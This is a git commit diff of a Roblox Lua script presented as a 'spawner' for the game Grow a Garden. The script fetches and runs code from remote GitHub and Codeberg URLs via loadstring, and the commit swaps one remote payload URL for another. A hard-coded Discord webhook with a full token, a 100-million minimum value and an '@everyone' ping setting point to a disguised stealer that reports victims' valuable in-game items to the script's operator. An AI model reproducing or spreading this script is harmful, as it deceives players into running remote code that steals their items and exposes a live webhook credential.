2826451f70aa059563e482bc290a2629767dcbf7
thatboyskulls12 <aj.skulls12@gmail.com>
2025-07-24 12:39:59 -0400

    Update GAG_SPAWNER.lua

--- GAG_SPAWNER.lua
+++ GAG_SPAWNER.lua
@@ -1,4 +1,3 @@
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/gui_loader.lua"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/GAG-SKULLS/refs/heads/main/spawning_gui.lua"))()
@@ -8,5 +7,4 @@ _G.min_value = 100000000 -- 100 million
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1397737960925036605/6OL-UU-x_pYYOauEmwmR1t-yAA6lkOX5oWpxz0MmfRGRKPBFx_9EkMh5Zg8dquFb6Kwr" --;o"/., ,,. change to your webhook
 
-
-loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/gag"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/GAG-SKULLS/refs/heads/main/Source.lua"))()
